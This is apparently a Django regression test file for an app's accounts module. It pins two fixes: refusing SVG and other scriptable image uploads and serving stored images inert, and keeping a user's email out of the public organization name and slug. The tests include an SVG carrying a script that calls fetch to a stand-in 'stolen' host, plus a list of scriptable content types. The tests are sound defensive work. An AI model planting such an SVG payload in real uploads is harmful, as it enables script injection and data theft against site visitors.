"""Regression tests for apps.accounts. Two unrelated defects are pinned
here, each in its own section; both are "this already regressed silently
once", which is this repo's bar for a checked-in test.

1. **Images** (D6, 2026-09-06) — what Habitat accepts as an image, and what
   it serves that image back as. Immediately below.
2. **Signup does not publish the user's email address** (D8, 2026-09-07) —
   see SignupDoesNotPublishTheEmailTests at the bottom of this file.

--- 1. Images ---

These exist because of a specific defect (found 2026-09-06, fixed the same
day). All four upload endpoints validated the *client-supplied* multipart
`Content-Type` with `startswith("image/")`, and all eight serving paths
echoed the stored string back as the response `Content-Type`. So a caller
could upload `image/svg+xml` — SVG is not an inert raster format, it can
carry `<script>` — and the app would hand it back under that same type.
Loading such a file in an `<img>` never executes script, so the app's own
photo grids were fine; the vector was *navigating* to the photo URL, which
runs the author's script on the origin that served it. Since Habitat serves
app, API and public site from one origin by default, and the public photo
endpoints are `AllowAny` (a stable, shareable, unauthenticated URL), that
origin is the app's own.

Two properties are pinned here, and the second is the one most likely to be
mistaken for redundant:

1. **Upload rejects a scriptable type.** The allowlist is the fix.
2. **Serving never echoes a stored string.** A row written *before* the
   allowlist existed must not still be able to steer a response header —
   otherwise the fix would only protect databases that were already clean.
   `test_preexisting_svg_row_is_not_served_as_svg` constructs exactly such
   a row directly in the database (as the old code would have written it)
   and asserts the response is inert.

`test_nosniff_is_on` pins the other half of why an allowlist on the
*declared* type is sufficient without sniffing the bytes: uploading SVG
bytes under a declared `image/png` is served as `image/png`, and `nosniff`
stops the browser sniffing its way back to SVG. If that header ever goes
away, the allowlist alone is weaker than this module claims — so the test
explains itself rather than just going red.

Run with: python manage.py test apps.accounts
"""

from django.contrib.gis.geos import Point, Polygon
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import SimpleTestCase, TestCase
from django.urls import reverse
from django.utils import timezone

from apps.accounts.images import (
    ALLOWED_IMAGE_TYPES,
    FALLBACK_CONTENT_TYPE,
    image_content_type,
    normalize_image_type,
    validate_image_upload,
)
from apps.accounts.models import Membership, Organization, Property, User
from apps.activities.models import Activity, ActivityPhoto, ActivityType, WorkflowState
from apps.sightings.models import Sighting, SightingPhoto
from apps.species.models import Species

SQUARE = Polygon(((0, 0), (0, 1), (1, 1), (1, 0), (0, 0)))

# A real, minimal SVG that would execute if a browser were allowed to treat
# it as one — this is the payload the fix exists to refuse.
SVG_BYTES = (
    b'<svg xmlns="http://www.w3.org/2000/svg"><script>'
    b"fetch('https://example.invalid/stolen')</script></svg>"
)
PNG_BYTES = b"\x89PNG\r\n\x1a\n" + b"\x00" * 32


class ImageTypeNormalizationTests(SimpleTestCase):
    """The pure helper, with no database — the allowlist's actual edges."""

    def test_scriptable_types_are_refused(self):
        for hostile in [
            "image/svg+xml",
            "image/svg",
            "text/html",
            "application/xhtml+xml",
            "application/javascript",
        ]:
            self.assertEqual(normalize_image_type(hostile), "", hostile)

    def test_allowed_types_pass_through(self):
        for allowed in ALLOWED_IMAGE_TYPES:
            self.assertEqual(normalize_image_type(allowed), allowed)

    def test_parameters_and_casing_do_not_smuggle_a_type_past_the_check(self):
        # A naive equality check against the raw header would reject these
        # legitimate uploads; a naive `startswith` would accept the SVG one.
        self.assertEqual(normalize_image_type("IMAGE/JPEG"), "image/jpeg")
        self.assertEqual(normalize_image_type("image/jpeg; charset=binary"), "image/jpeg")
        self.assertEqual(normalize_image_type("  image/png  "), "image/png")
        self.assertEqual(normalize_image_type("image/svg+xml; charset=utf-8"), "")

    def test_prefix_lookalikes_are_refused(self):
        """`startswith("image/")` — the old check — accepted all of these."""
        for lookalike in ["image/svg+xml", "image/anything", "image/"]:
            self.assertEqual(normalize_image_type(lookalike), "", lookalike)

    def test_jpg_alias_resolves_to_jpeg(self):
        self.assertEqual(normalize_image_type("image/jpg"), "image/jpeg")

    def test_empty_and_missing_values_are_refused(self):
        for empty in ["", None, "   "]:
            self.assertEqual(normalize_image_type(empty), "")

    def test_validate_image_upload_reads_the_declared_type(self):
        good = SimpleUploadedFile("a.png", PNG_BYTES, content_type="image/png")
        bad = SimpleUploadedFile("a.svg", SVG_BYTES, content_type="image/svg+xml")
        self.assertEqual(validate_image_upload(good), "image/png")
        self.assertEqual(validate_image_upload(bad), "")

    def test_serving_never_returns_an_unallowlisted_stored_value(self):
        """The backfill-proof half, at the unit level."""
        self.assertEqual(image_content_type("image/png"), "image/png")
        self.assertEqual(image_content_type("image/svg+xml"), FALLBACK_CONTENT_TYPE)
        self.assertEqual(image_content_type("text/html"), FALLBACK_CONTENT_TYPE)
        self.assertEqual(image_content_type(""), FALLBACK_CONTENT_TYPE)


class ImageUploadEndpointTests(TestCase):
    """The four upload endpoints must all refuse a scriptable type, and all
    still accept an ordinary photo."""

    def setUp(self):
        self.org = Organization.objects.create(name="Test Org")
        self.user = User.objects.create_user(email="e@example.com", password="pw-12345678")
        Membership.objects.create(
            organization=self.org, user=self.user, role=Membership.Role.ADMIN
        )
        self.property = Property.objects.create(
            organization=self.org, name="P", boundary=SQUARE, is_public=True
        )
        status = WorkflowState.objects.filter(organization=self.org).first()
        activity_type = ActivityType.objects.filter(organization=self.org).first()
        self.activity = Activity.objects.create(
            organization=self.org,
            property=self.property,
            activity_type=activity_type,
            status=status,
            geometry=SQUARE,
            is_public=True,
        )
        species = Species.objects.create(
            organization=self.org, common_name="Common Milkweed"
        )
        self.sighting = Sighting.objects.create(
            organization=self.org,
            property=self.property,
            species=species,
            location=Point(0.5, 0.5),
            observed_at=timezone.now(),
            is_public=True,
        )
        self.client.force_login(self.user)

    def _upload(self, url, content_type, name="f"):
        payload = SVG_BYTES if "svg" in content_type else PNG_BYTES
        return self.client.post(
            url,
            {"image": SimpleUploadedFile(name, payload, content_type=content_type)},
        )

    def _urls(self):
        return [
            reverse("activity-photos", args=[self.activity.id]),
            reverse("sighting-photos", args=[self.sighting.id]),
            reverse("org-theme-image"),
            reverse("property-theme-image", args=[self.property.id]),
        ]

    def test_every_upload_endpoint_refuses_svg(self):
        for url in self._urls():
            response = self._upload(url, "image/svg+xml", name="x.svg")
            self.assertEqual(response.status_code, 400, url)

    def test_every_upload_endpoint_still_accepts_a_png(self):
        """The guard against a fix that simply breaks uploads."""
        for url in self._urls():
            response = self._upload(url, "image/png", name="x.png")
            self.assertIn(response.status_code, (200, 201), f"{url} -> {response.status_code}")

    def test_stored_type_is_the_normalized_value_not_the_clients_string(self):
        self._upload(reverse("activity-photos", args=[self.activity.id]), "image/jpg")
        self.assertEqual(ActivityPhoto.objects.get().content_type, "image/jpeg")


class ImageServingTests(TestCase):
    """A row that predates the allowlist must still be served inert."""

    def setUp(self):
        self.org = Organization.objects.create(name="Test Org")
        self.user = User.objects.create_user(email="e@example.com", password="pw-12345678")
        Membership.objects.create(
            organization=self.org, user=self.user, role=Membership.Role.ADMIN
        )
        self.property = Property.objects.create(
            organization=self.org, name="P", boundary=SQUARE, is_public=True
        )
        status = WorkflowState.objects.filter(organization=self.org).first()
        activity_type = ActivityType.objects.filter(organization=self.org).first()
        self.activity = Activity.objects.create(
            organization=self.org,
            property=self.property,
            activity_type=activity_type,
            status=status,
            geometry=SQUARE,
            is_public=True,
        )
        species = Species.objects.create(
            organization=self.org, common_name="Common Milkweed"
        )
        self.sighting = Sighting.objects.create(
            organization=self.org,
            property=self.property,
            species=species,
            location=Point(0.5, 0.5),
            observed_at=timezone.now(),
            is_public=True,
        )
        # Written exactly as the pre-fix upload path would have written it.
        self.activity_photo = ActivityPhoto.objects.create(
            activity=self.activity, image=SVG_BYTES, content_type="image/svg+xml"
        )
        self.sighting_photo = SightingPhoto.objects.create(
            sighting=self.sighting, image=SVG_BYTES, content_type="image/svg+xml"
        )
        self.org.theme_header_image = SVG_BYTES
        self.org.theme_header_image_content_type = "image/svg+xml"
        self.org.save()
        self.property.theme_header_image = SVG_BYTES
        self.property.theme_header_image_content_type = "image/svg+xml"
        self.property.save()

    def _public_urls(self):
        return [
            reverse(
                "public-activity-photo-image",
                args=[self.activity.id, self.activity_photo.id],
            ),
            reverse(
                "public-sighting-photo-image",
                args=[self.sighting.id, self.sighting_photo.id],
            ),
            reverse("public-organization-theme-image", args=[self.org.id]),
            reverse("public-property-theme-image", args=[self.property.id]),
        ]

    def test_preexisting_svg_row_is_not_served_as_svg_anonymously(self):
        """The `AllowAny` paths — the shareable URLs, and the ones that
        matter most."""
        for url in self._public_urls():
            response = self.client.get(url)
            self.assertEqual(response.status_code, 200, url)
            self.assertEqual(response["Content-Type"], FALLBACK_CONTENT_TYPE, url)

    def test_preexisting_svg_row_is_not_served_as_svg_when_authenticated(self):
        self.client.force_login(self.user)
        for url in [
            reverse(
                "activity-photo-image", args=[self.activity.id, self.activity_photo.id]
            ),
            reverse(
                "sighting-photo-image", args=[self.sighting.id, self.sighting_photo.id]
            ),
            reverse("org-theme-image"),
            reverse("property-theme-image", args=[self.property.id]),
        ]:
            response = self.client.get(url)
            self.assertEqual(response.status_code, 200, url)
            self.assertEqual(response["Content-Type"], FALLBACK_CONTENT_TYPE, url)

    def test_the_bytes_are_still_served_unchanged(self):
        """Only the declared type is corrected — the fix does not silently
        corrupt or drop stored image data."""
        response = self.client.get(self._public_urls()[0])
        self.assertEqual(response.content, SVG_BYTES)

    def test_an_ordinary_photo_keeps_its_real_type(self):
        photo = ActivityPhoto.objects.create(
            activity=self.activity, image=PNG_BYTES, content_type="image/png"
        )
        response = self.client.get(
            reverse("public-activity-photo-image", args=[self.activity.id, photo.id])
        )
        self.assertEqual(response["Content-Type"], "image/png")

    def test_nosniff_is_on(self):
        """Why allowlisting the declared type is enough without sniffing the
        bytes: SVG bytes uploaded as `image/png` are served as `image/png`,
        and this header stops the browser sniffing back to SVG."""
        response = self.client.get(self._public_urls()[0])
        self.assertEqual(response.headers.get("X-Content-Type-Options"), "nosniff")


# --- 2. Signup does not publish the user's email address (D8) ---

# A distinctive local part, so the substring assertions below are meaningful
# rather than accidentally matching boilerplate. The pre-fix code named the
# org "<this address>'s land", which slugify() turns into
# "d8canaryexampleinvalids-land" — hence checking for the punctuation-stripped
# forms too, not just the address as typed.
CANARY_EMAIL = "d8canary@example.invalid"
CANARY_LOCAL_PART = "d8canary"
CANARY_SQUASHED = "d8canaryexampleinvalid"


class SignupDoesNotPublishTheEmailTests(TestCase):
    """A signup that leaves the optional account name blank must not put the
    signing-up user's email address on the public site.

    The defect (D8, found and fixed 2026-09-07): signup named a nameless org
    `f"{email}'s land"`, and `Organization.save()` slugifies `name` into the
    public vanity URL. `apps/public_site/views.py#organization_detail` has no
    visibility gate at all — no `is_public`, no membership check, no "has
    this org published anything" condition — so both the name and the slug
    were served to anonymous callers at a stable URL. A user who signed up,
    left one optional field blank and published *nothing* still had their
    email address exposed, in two fields, on two routes.

    What these tests deliberately do **not** assert: that an organization is
    hidden when it has published nothing. Whether `Organization` should gain
    an `is_public` gate mirroring `Property`'s is an open question for the
    owner (D8's Q2 — either default has a real cost), as is whether existing
    email-derived rows get backfilled (Q1 — a rename alone does not change
    an already-shared public URL, see `Organization.save()`). Those stay
    open; this module pins only the half that needed no decision.

    So `test_the_public_page_is_still_served` below is not an oversight — it
    records that closing Q2 is a *deliberate* omission, so a future reader
    can't mistake these passing tests for "the org page is gated now".
    """

    def _signup(self, **extra):
        return self.client.post(
            "/api/auth/signup/",
            {"email": CANARY_EMAIL, "password": "a-perfectly-fine-passphrase", **extra},
            content_type="application/json",
        )

    def _public_bodies(self, organization):
        """The org's public payload over both routes D8 named — the numeric
        one and the vanity slug. Anonymous: no login is performed here."""
        return [
            self.client.get(
                reverse("public-organization", args=[organization.id])
            ).content.decode(),
            self.client.get(
                reverse("public-organization-slug", args=[organization.slug])
            ).content.decode(),
        ]

    def test_a_blank_account_name_is_not_derived_from_the_email(self):
        self.assertEqual(self._signup().status_code, 201)
        organization = Organization.objects.get()
        self.assertEqual(organization.name, Organization.DEFAULT_NAME)
        self.assertNotIn(CANARY_LOCAL_PART, organization.name.lower())

    def test_a_blank_account_name_does_not_leak_the_email_into_the_public_slug(self):
        """The slug is the half most easily missed: it is generated from
        `name`, so fixing the name without checking the slug would look
        right and still publish the address with its punctuation stripped."""
        self.assertEqual(self._signup().status_code, 201)
        slug = Organization.objects.get().slug
        self.assertTrue(slug)
        self.assertNotIn(CANARY_LOCAL_PART, slug)
        self.assertNotIn(CANARY_SQUASHED, slug)

    def test_the_anonymous_public_payload_contains_no_part_of_the_email(self):
        """The end-to-end property, over the exact unauthenticated routes the
        finding named. Asserted against the whole response body rather than
        one field, so a future serializer that adds another email-derived
        field fails here too."""
        self.assertEqual(self._signup().status_code, 201)
        organization = Organization.objects.get()
        for body in self._public_bodies(organization):
            self.assertNotIn(CANARY_EMAIL, body)
            self.assertNotIn(CANARY_LOCAL_PART, body)
            self.assertNotIn(CANARY_SQUASHED, body)
            self.assertNotIn("@", body)

    def test_the_public_page_is_still_served(self):
        """Pins D8's Q2 as *open*, not closed. An organization that has
        published nothing is still readable by anyone — that is unchanged and
        deliberate, and it is the owner's call to change. If this test starts
        failing, someone answered Q2; update this module rather than
        'repairing' the assertion."""
        self.assertEqual(self._signup().status_code, 201)
        organization = Organization.objects.get()
        response = self.client.get(reverse("public-organization", args=[organization.id]))
        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.json()["organization"]["name"], Organization.DEFAULT_NAME)

    def test_a_supplied_account_name_is_used_verbatim(self):
        """The normal path is untouched — this guards against a fix that
        stops honouring the field at all."""
        self.assertEqual(self._signup(organization_name="Mira Canyon Trust").status_code, 201)
        organization = Organization.objects.get()
        self.assertEqual(organization.name, "Mira Canyon Trust")
        self.assertEqual(organization.slug, "mira-canyon-trust")

    def test_a_whitespace_only_account_name_is_treated_as_blank(self):
        """`signup` strips the field, so "   " must take the default rather
        than creating an unnamed org whose slug falls back to `"org"`."""
        self.assertEqual(self._signup(organization_name="   ").status_code, 201)
        self.assertEqual(Organization.objects.get().name, Organization.DEFAULT_NAME)

    def test_two_blank_name_signups_get_distinct_slugs(self):
        """The default name collides by construction, where the email-derived
        one never did — so uniqueness is a new load-bearing property of this
        change, not a pre-existing one."""
        self.assertEqual(self._signup().status_code, 201)
        self.client.post("/api/auth/logout/")
        second = self.client.post(
            "/api/auth/signup/",
            {"email": "d8canary-two@example.invalid", "password": "a-perfectly-fine-passphrase"},
            content_type="application/json",
        )
        self.assertEqual(second.status_code, 201)

        slugs = list(Organization.objects.order_by("id").values_list("slug", flat=True))
        self.assertEqual(len(slugs), 2)
        self.assertEqual(len(set(slugs)), 2, f"slugs collided: {slugs}")
        for slug in slugs:
            self.assertNotIn("d8canary", slug)
